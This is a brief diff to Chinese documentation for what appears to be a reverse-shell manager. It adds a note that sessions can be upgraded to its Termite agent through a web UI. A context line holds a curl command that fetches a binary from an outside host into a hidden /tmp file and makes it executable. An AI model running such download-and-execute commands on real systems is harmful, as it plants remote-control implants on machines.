@@ -30,4 +30,8 @@ curl -fsSL http://1.3.3.7:13339/termite/1.3.3.7:13337 -o /tmp/.H0Z9 && chmod +x 
 » Upgrade 1.3.3.7:13337
 ```
 
+您也可以通过 Web 界面来升级到 Termite。
+
+![](/images/webui/upgrade.gif)
+
 与 Termite 交互的逻辑与通常的反向 Shell 一致，即：`Jump` 然后 `Interact`。
